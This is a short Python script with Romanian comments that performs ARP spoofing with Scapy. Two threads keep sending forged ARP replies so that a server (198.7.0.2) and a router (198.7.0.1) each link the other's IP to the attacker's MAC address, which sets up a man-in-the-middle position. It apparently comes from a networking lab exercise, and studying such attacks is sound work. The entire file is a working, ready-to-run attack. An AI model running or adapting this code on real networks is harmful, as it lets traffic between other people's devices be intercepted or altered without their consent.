from scapy.all import ARP, send #folosim .all ptc ARP si send sunt din module diferite
import threading as th
import time

#construim si trimitem un pachet ARP otravitor
def poison_arp(victim_ip, spoof_ip, attacker_mac):
	packet = ARP()
	packet.pdst = victim_ip #specificam adresa IP a victimei ca sa nu ignore pachetul
	packet.hwdst = "ff:ff:ff:ff:ff:ff" #trimitem pachetul tuturor dispozitivelor din reteaua locala ptc s-ar putea sa nu cunoastem adresa MAC a victimei
	packet.psrc = spoof_ip #adresa IP drept care ne dam
	packet.hwsrc = attacker_mac #adresa noastra MAC care urmeaza a fi asociata cu IP-ul de mai sus
	send(packet)

#trimitem pachete otravitoare in mod constant
def constant_poison(victim_ip, spoof_ip, attacker_mac, delay):
	while True:
		poison_arp(victim_ip, spoof_ip, attacker_mac)
		time.sleep(delay) #luam o scurta pauza sa nu aglomeram traficul pe retea

server_ip = "198.7.0.2"
router_ip = "198.7.0.1"
middle_mac = "02:42:c6:07:00:03"
delay = 2

#folosim 2 thread-uri deoarece vrem sa pacalim concomitent victimele
attack_server = th.Thread(target = constant_poison, 
			  args = (server_ip, router_ip, middle_mac, delay))
attack_router = th.Thread(target = constant_poison, 
			  args = (router_ip, server_ip, middle_mac, delay))

attack_server.start()
attack_router.start()

attack_server.join()
attack_router.join()

